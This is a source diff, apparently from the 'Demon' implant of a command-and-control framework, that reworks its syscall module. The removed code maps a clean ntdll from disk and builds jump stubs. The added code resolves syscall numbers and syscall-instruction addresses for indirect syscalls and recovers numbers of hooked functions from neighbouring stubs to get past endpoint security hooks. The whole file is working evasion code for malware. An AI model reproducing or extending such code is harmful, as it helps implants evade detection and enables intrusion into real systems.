@@ -1,241 +1,237 @@
 #include <Demon.h>
+
+#include <Common/Defines.h>
 #include <Core/Syscalls.h>
-#include <Core/MiniStd.h>
-#include <ntstatus.h>
+#include <Core/Win32.h>
 
-#ifdef OBF_SYSCALL
+/*!
+ * Initialize syscall addr + ssn
+ * @param Ntdll
+ * @return
+ */
+BOOL SysInitialize(
+    IN PVOID Ntdll
+) {
+    PVOID SysNativeFunc   = NULL;
+    PVOID SysIndirectAddr = NULL;
 
-// TODO: refactor all this
-PVOID SyscallLdrNtdll()
-{
-    OBJECT_ATTRIBUTES   ObjectAttributes    = { 0 };
-    UNICODE_STRING      ObjectPath          = { 0 };
-    IO_STATUS_BLOCK     IoStatusBlock       = { 0 };
-
-    HANDLE              hFile               = NULL;
-    HANDLE              hSection            = NULL;
-    LPVOID              pSection            = NULL;
-    SIZE_T              ViewSize            = 0;
-    PWCHAR              NtdllPath           = L"\\??\\C:\\Windows\\System32\\ntdll.dll"; // TODO: xor encrypt this
-    SIZE_T              Size                = 0;
-    CONST SIZE_T        UnicodeMaxSize      = ( USHRT_MAX & ~1 ) - sizeof( UNICODE_NULL );
-
-    Size = StringLengthW( NtdllPath ) * sizeof( WCHAR );
-
-    if ( Size > UnicodeMaxSize )
-        Size = UnicodeMaxSize;
-
-    ObjectPath.Length = ObjectPath.MaximumLength = Size;
-    ObjectPath.Buffer = NtdllPath;
-
-    InitializeObjectAttributes( &ObjectAttributes, &ObjectPath, OBJ_CASE_INSENSITIVE, 0, NULL );
-
-    if ( NT_SUCCESS( Instance.Syscall.NtOpenFile( &hFile, FILE_READ_DATA, &ObjectAttributes, &IoStatusBlock, FILE_SHARE_READ, 0 ) ) )
-    {
-        if ( NT_SUCCESS( Instance.Syscall.NtCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_COMMIT, hFile ) ) )
-        {
-            if ( NT_SUCCESS( Instance.Syscall.NtMapViewOfSection( hSection, NtCurrentProcess(), &pSection, NULL, NULL, NULL, &ViewSize, 1, 0, PAGE_READONLY ) ) )
-            {
-                PRINTF( "pSection => %p\n", pSection );
-                return pSection;
-            }
-        }
-    }
-
-    if ( hSection )
-        Instance.Win32.NtClose( hSection );
-    if ( hFile )
-        Instance.Win32.NtClose( hFile );
-
-    return NULL;
-}
-
-ULONG_PTR BuildSyscallStub( ULONG_PTR StubRegion, DWORD dwSyscallNo )
-{
-    LPVOID  Masquerade     = LdrFunctionAddr( Instance.Modules.Ntdll, 0x180024b6 );
-    LPVOID  syscallAddress = Masquerade + 18;
-    BYTE    SyscallStub[]  = { 0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00, 0x00, 0x00, };
-    UCHAR   jumpPrelude[]  = { 0x00, 0x49, 0xBB };
-    UCHAR   jumpAddress[]  = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
-    UCHAR   jumpEpilogue[] = { 0x41, 0xFF, 0xE3, 0xC3 };
-
-    *( LPVOID * ) ( jumpAddress ) = syscallAddress;
-
-    MemCopy( ( PBYTE )StubRegion, SyscallStub, sizeof( SyscallStub ) );
-    MemCopy( ( PBYTE )StubRegion + 7, jumpPrelude, 3 );
-    MemCopy( ( PBYTE )StubRegion + 7 + 3, jumpAddress, sizeof( jumpAddress ) );
-    MemCopy( ( PBYTE )StubRegion + 7 + 3 + 8, jumpEpilogue, 4 );
-
-    *( PDWORD )( StubRegion + 4 ) = dwSyscallNo;
-
-    return StubRegion;
-}
-
-BOOL SyscallsInit()
-{
-    PIMAGE_NT_HEADERS     ImageNtHeaders        = NULL;
-    PIMAGE_SECTION_HEADER SectionHeader         = NULL;
-    DWORD                 SysNtOpenFile         = 0;
-    DWORD                 SysNtCreateSection    = 0;
-    DWORD                 SysNtMapViewOfSection = 0;
-    ULONG_PTR             DataSectionAddress    = 0;
-    DWORD                 DataSectionSize       = 0;
-    LPVOID                SyscallRegion         = NULL;
-    DWORD                 OldProtection         = 0;
-
-    ImageNtHeaders = RVA( PIMAGE_NT_HEADERS, Instance.Modules.Ntdll, ( ( PIMAGE_DOS_HEADER ) Instance.Modules.Ntdll )->e_lfanew );
-    SectionHeader  = C_PTR( &ImageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader );
-
-    for ( WORD i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++ )
-    {
-        if ( ! MemCompare( SectionHeader[ i ].Name, ".data", 5 ) )
-        {
-            DataSectionAddress = ( ULONG_PTR )( U_PTR( Instance.Modules.Ntdll ) + SectionHeader[ i ].VirtualAddress );
-            DataSectionSize    = SectionHeader[ i ].Misc.VirtualSize;
-            break;
-        }
-    }
-
-    if ( ! DataSectionAddress || DataSectionSize < 16 * 5 )
+    if ( ! Ntdll ) {
         return FALSE;
+    }
 
-    for ( UINT uiOffset = 0; uiOffset < DataSectionSize - (16 * 5); uiOffset++ )
+    /* Resolve Syscall instruction from dummy nt function */
+    if ( ( SysNativeFunc = LdrFunctionAddr( Ntdll, H_FUNC_NTADDBOOTENTRY ) ) )
     {
-        if ( *( PDWORD ) ( DataSectionAddress + uiOffset )      == 0xb8d18b4c &&
-             *( PDWORD ) ( DataSectionAddress + uiOffset + 16 ) == 0xb8d18b4c &&
-             *( PDWORD ) ( DataSectionAddress + uiOffset + 32 ) == 0xb8d18b4c &&
-             *( PDWORD ) ( DataSectionAddress + uiOffset + 48 ) == 0xb8d18b4c &&
-             *( PDWORD ) ( DataSectionAddress + uiOffset + 64 ) == 0xb8d18b4c )
-        {
-            SysNtOpenFile         = *( PDWORD ) ( DataSectionAddress + uiOffset + 4 );
-            SysNtCreateSection    = *( PDWORD ) ( DataSectionAddress + uiOffset + 16 + 4 );
-            SysNtMapViewOfSection = *( PDWORD ) ( DataSectionAddress + uiOffset + 64 + 4 );
-            break;
+        /* resolve address */
+        SysExtract( SysNativeFunc, TRUE, NULL, &SysIndirectAddr );
+
+        /* check if we managed to resolve it  */
+        if ( SysIndirectAddr ) {
+            Instance.Syscall.SysAddress = SysIndirectAddr;
+        } else {
+            PUTS_DONT_SEND( "Failed to resolve SysIndirectAddr" );
         }
     }
 
-    SyscallRegion = Instance.Win32.VirtualAllocEx( NtCurrentProcess(), NULL, 3 * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
-    if ( ! SyscallRegion )
-        return FALSE;
-
-    Instance.Syscall.NtOpenFile         = BuildSyscallStub( ( ULONG_PTR ) SyscallRegion, SysNtOpenFile );
-    Instance.Syscall.NtCreateSection    = BuildSyscallStub( SyscallRegion + MAX_SYSCALL_STUB_SIZE, SysNtCreateSection );
-    Instance.Syscall.NtMapViewOfSection = BuildSyscallStub( ( ULONG_PTR ) SyscallRegion + ( 2 * MAX_SYSCALL_STUB_SIZE ), SysNtMapViewOfSection );
-
-    Instance.Win32.VirtualProtectEx( NtCurrentProcess(), SyscallRegion, 3 * MAX_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &OldProtection );
-
-    return TRUE;
-}
-
-ULONG_PTR RVAToFileOffsetPointer( ULONG_PTR pModule, DWORD dwRVA )
-{
-    PIMAGE_NT_HEADERS       ImageNtHeaders  = ( PIMAGE_NT_HEADERS )( pModule + ( ( PIMAGE_DOS_HEADER ) pModule )->e_lfanew );
-    PIMAGE_SECTION_HEADER   SectionHeader   = ( PIMAGE_SECTION_HEADER )( ( ULONG_PTR ) &ImageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader );
-
-    for ( WORD i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++ )
+#if _M_IX86
+    if ( IsWoW64() )
     {
-        if ( SectionHeader[i].VirtualAddress <= dwRVA && SectionHeader[ i ].VirtualAddress + SectionHeader[ i ].Misc.VirtualSize > dwRVA )
-        {
-            dwRVA -= SectionHeader[ i ].VirtualAddress;
-            dwRVA += SectionHeader[ i ].PointerToRawData;
-
-            return pModule + dwRVA;
-        }
+        Instance.Syscall.SysAddress = __readfsdword(0xC0);
     }
-
-    return 0;
-}
-
-ULONG_PTR FindBytes( ULONG_PTR Source, DWORD SourceLength, ULONG_PTR Search, DWORD SearchLength )
-{
-    while ( SearchLength <= SourceLength )
-    {
-        if ( ! MemCompare( (PVOID)Source, (PVOID)Search, SearchLength ) )
-            return Source;
-
-        Source++;
-        SourceLength--;
-    }
-
-    return 0;
-}
-
-UINT SyscallsExtract( ULONG_PTR pNtdll, PSYSCALL_STUB Syscalls )
-{
-    PUTS( "Start" )
-
-    LPVOID  FakeSyscall     = LdrFunctionAddr( Instance.Modules.Ntdll, 0x180024b6 );
-    LPVOID  syscallAddress  = ( PCHAR ) FakeSyscall + 18;
-    UCHAR   jumpPrelude[]   = { 0x00, 0x49, 0xBB };
-    UCHAR   jumpAddress[]   = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
-    UCHAR   jumpEpilogue[]  = { 0x41, 0xFF, 0xE3, 0xC3 };
-    UINT    uiCount         = 0;
-    CHAR    Name[ PATH_MAX ]= { 0 };
-    PVOID   pStubs          = NULL;
-
-    *( LPVOID* )( jumpAddress ) = syscallAddress;
-
-    PIMAGE_NT_HEADERS       ImageNtHeaders  = RVA( PIMAGE_NT_HEADERS, pNtdll, ( ( PIMAGE_DOS_HEADER ) pNtdll )->e_lfanew );
-    PIMAGE_DATA_DIRECTORY   DataDirectory   = ImageNtHeaders->OptionalHeader.DataDirectory;
-    DWORD                   VirtualAddress  = DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
-    PIMAGE_EXPORT_DIRECTORY ExportDirectory = RVAToFileOffsetPointer( pNtdll, VirtualAddress );
-    DWORD                   NumberOfNames   = ExportDirectory->NumberOfNames;
-    PDWORD                  Functions       = RVAToFileOffsetPointer( pNtdll, ExportDirectory->AddressOfFunctions );
-    PDWORD                  Names           = RVAToFileOffsetPointer( pNtdll, ExportDirectory->AddressOfNames );
-    PWORD                   Ordinals        = RVAToFileOffsetPointer( pNtdll, ExportDirectory->AddressOfNameOrdinals );
-
-    pStubs = Instance.Win32.VirtualAllocEx( NtCurrentProcess(), NULL, MAX_NUMBER_OF_SYSCALLS * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-    if ( ! pStubs )
-        return 0;
-
-    for ( DWORD i = 0; i < NumberOfNames && uiCount < MAX_NUMBER_OF_SYSCALLS; i++ )
-    {
-        PCHAR FunctionName = ( PCHAR ) RVAToFileOffsetPointer( pNtdll, Names[ i ] );
-
-        if ( *( PUSHORT ) FunctionName == 'wZ' )
-        {
-            ULONG_PTR FunctionPtr = RVAToFileOffsetPointer( pNtdll, Functions[ Ordinals[ i ] ] );
-            ULONG_PTR FunctionEnd = FindBytes( FunctionPtr, MAX_SYSCALL_STUB_SIZE, ( ULONG_PTR )"\x0f\x05\xc3", 3 ) + 3;
-
-            if ( FunctionEnd )
-            {
-                MemCopy( Name, FunctionName, StringLengthA( FunctionName ) );
-
-                *( PWORD ) ( Name ) = 'tN';
-                Syscalls[ uiCount ].Hash = HashStringA( Name );
-
-                MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ), FunctionPtr, FunctionEnd - FunctionPtr - 13 );
-                MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ) + 7, jumpPrelude, 3 );
-                MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ) + 7 + 3, jumpAddress, 8 );
-                MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ) + 7 + 3 + 8, jumpEpilogue, 4 );
-
-                Syscalls[ uiCount ].Stub = pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE );
-
-                MemSet( Name, 0, MAX_PATH );
-
-                uiCount++;
-            }
-        }
-    }
-
-    // Instance.Win32.VirtualProtectEx( NtCurrentProcess(), pStubs, 3 * MAX_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &OldProtection );
-
-    return uiCount;
-}
-
-PVOID SyscallsObf( PSYSCALL_STUB Syscalls, UINT uiCount, DWORD dwSyscallHash )
-{
-    for ( UINT32 i = 0; i < uiCount; i++ )
-    {
-        if ( Syscalls[ i ].Hash == dwSyscallHash )
-        {
-            PRINTF( "Syscall stub => %p\n", Syscalls[ i ].Stub )
-            return Syscalls[ i ].Stub;
-        }
-    }
-
-    PUTS( "Couldn't found syscalls" )
-    return NULL;
-}
-
 #endif
+
+    /* Resolve Ssn */
+    SYS_EXTRACT( NtOpenThread )
+    SYS_EXTRACT( NtOpenThreadToken )
+    SYS_EXTRACT( NtOpenProcess )
+    SYS_EXTRACT( NtTerminateProcess )
+    SYS_EXTRACT( NtOpenProcessToken )
+    SYS_EXTRACT( NtDuplicateToken )
+    SYS_EXTRACT( NtQueueApcThread )
+    SYS_EXTRACT( NtSuspendThread )
+    SYS_EXTRACT( NtResumeThread )
+    SYS_EXTRACT( NtCreateEvent )
+    SYS_EXTRACT( NtCreateThreadEx )
+    SYS_EXTRACT( NtDuplicateObject )
+    SYS_EXTRACT( NtGetContextThread )
+    SYS_EXTRACT( NtSetContextThread )
+    SYS_EXTRACT( NtQueryInformationProcess )
+    SYS_EXTRACT( NtQuerySystemInformation )
+    SYS_EXTRACT( NtWaitForSingleObject )
+    SYS_EXTRACT( NtAllocateVirtualMemory )
+    SYS_EXTRACT( NtWriteVirtualMemory )
+    SYS_EXTRACT( NtReadVirtualMemory )
+    SYS_EXTRACT( NtFreeVirtualMemory )
+    SYS_EXTRACT( NtUnmapViewOfSection )
+    SYS_EXTRACT( NtProtectVirtualMemory )
+    SYS_EXTRACT( NtTerminateThread )
+    SYS_EXTRACT( NtAlertResumeThread )
+    SYS_EXTRACT( NtSignalAndWaitForSingleObject )
+    SYS_EXTRACT( NtQueryVirtualMemory )
+    SYS_EXTRACT( NtQueryInformationToken )
+    SYS_EXTRACT( NtQueryInformationThread )
+    SYS_EXTRACT( NtQueryObject )
+    SYS_EXTRACT( NtClose )
+    SYS_EXTRACT( NtSetEvent )
+    SYS_EXTRACT( NtSetInformationThread )
+    SYS_EXTRACT( NtSetInformationVirtualMemory )
+    SYS_EXTRACT( NtGetNextThread )
+}
+
+/*!
+ * extract syscall service number (SSN) and or
+ * syscall instruction address
+ * @param Function       Native function address to extract Ssn/SysAddr from
+ * @param ResolveHooked  if the function should call FindSsnOfHookedSyscall upon failure
+ * @param Ssn            extracted ssn
+ * @param Addr           extracted sys addr
+ * @return               if extracting the syscall was successful
+ */
+BOOL SysExtract(
+    IN  PVOID  Function,
+    IN  BOOL   ResolveHooked,
+    OUT PWORD  Ssn,
+    OUT PVOID* SysAddr
+) {
+    ULONG Offset      = 0;
+    BYTE  SsnLow      = 0;
+    BYTE  SsnHigh     = 0;
+    BOOL  Success     = FALSE;
+
+    /* check args */
+    if ( ! Function )
+    {
+        PUTS( "Function address is not defined" )
+        return FALSE;
+    }
+
+    if ( ! Ssn && ! SysAddr )
+    {
+        PRINTF( "No Ssn and SysAddr pointers set for function at 0x%p\n", Function )
+        return FALSE;
+    }
+
+    do {
+        /* check if current instruction is a 'ret' (end of function) */
+        if ( DREF_U8( Function + Offset ) == SYS_ASM_RET ) {
+            break;
+        }
+
+#if _WIN64
+        /* check current instructions for:
+         *   mov r10, rcx
+         *   mov rcx, [ssn]
+         */
+        if ( DREF_U8( Function + Offset + 0x0 ) == 0x4C &&
+             DREF_U8( Function + Offset + 0x1 ) == 0x8B &&
+             DREF_U8( Function + Offset + 0x2 ) == 0xD1 &&
+             DREF_U8( Function + Offset + 0x3 ) == 0xB8 )
+#else
+        /* check current instructions for:
+         *   mov eax, [ssn]
+         */
+        if ( DREF_U8( Function + Offset + 0x0 ) == 0xB8 )
+#endif
+        {
+            /* if the Ssn param has been specified try to get the Ssn of the function */
+            if ( Ssn )
+            {
+                SsnLow  = DREF_U8( Function + Offset + SSN_OFFSET_1 );
+                SsnHigh = DREF_U8( Function + Offset + SSN_OFFSET_2 );
+                *Ssn    = ( SsnHigh << 0x08 ) | SsnLow;
+                Success = TRUE;
+            }
+
+            /* if SysAddr has been specified then try to get the native function syscall instruction */
+            if ( SysAddr )
+            {
+                Success = FALSE;
+
+#if _M_IX86
+                if ( IsWoW64() )
+                {
+                    *SysAddr = __readfsdword(0xC0);
+                    Success  = TRUE;
+                    break;
+                }
+#endif
+
+                for ( int i = 0; i < SYS_RANGE; i++ )
+                {
+                    /* check if the current ( function + offset + i ) is 'syscall' instruction */
+                    if ( DREF_U16( Function + Offset + i ) == SYSCALL_ASM ) {
+                        *SysAddr = C_PTR( Function + Offset + i );
+                        Success  = TRUE;
+                        break;
+                    }
+                }
+            }
+
+            /* we should be finished */
+            break;
+        }
+
+        Offset++;
+    } while ( TRUE );
+
+    if ( ! Success && Ssn && ResolveHooked ) {
+        Success = FindSsnOfHookedSyscall( Function, Ssn );
+    }
+
+    if ( ! Success )
+    {
+        if ( Ssn ) {
+            PRINTF( "Could not resolve the Ssn of function at 0x%p\n", Function )
+        }
+
+        if ( SysAddr ) {
+            PRINTF( "Could not resolve the SysAddr of function at 0x%p\n", Function )
+        }
+    }
+
+    return Success;
+}
+
+/*
+ * If a function is hooked, we can't obtain the Ssn directly.
+ * Instead, we look for the Ssn of a neighbouring syscalls and add/subtract
+ * to their Ssn according to their distance.
+ * WARNING: This only works if Ssn are incremental!
+ */
+BOOL FindSsnOfHookedSyscall(
+    IN  PVOID  Function,
+    OUT PWORD  Ssn
+) {
+    UINT32 SyscallSize      = 0;
+    PVOID  NeighbourSyscall = NULL;
+    WORD   NeighbourSsn     = NULL;
+
+    PRINTF( "The syscall at address 0x%p seems to be hooked, trying to resolve its Ssn via neighbouring syscalls...\n", Function )
+
+    if ( ! ( SyscallSize = GetSyscallSize() ) ) {
+        PUTS( "Failed to obtain the size of the syscalls stub" )
+        return FALSE;
+    }
+
+
+    for ( UINT32 i = 1; i < 500; ++i )
+    {
+        // try with a syscall above ours
+        NeighbourSyscall = C_PTR( U_PTR( Function ) + ( SyscallSize * i ) );
+        if( SysExtract( NeighbourSyscall, FALSE, &NeighbourSsn, NULL ) )
+        {
+            *Ssn = NeighbourSsn - i;
+            return TRUE;
+        }
+
+        // try with a syscall below ours
+        NeighbourSyscall = C_PTR( U_PTR( Function ) - ( SyscallSize * i ) );
+        if( SysExtract( NeighbourSyscall, FALSE, &NeighbourSsn, NULL ) )
+        {
+            *Ssn = NeighbourSsn + i;
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
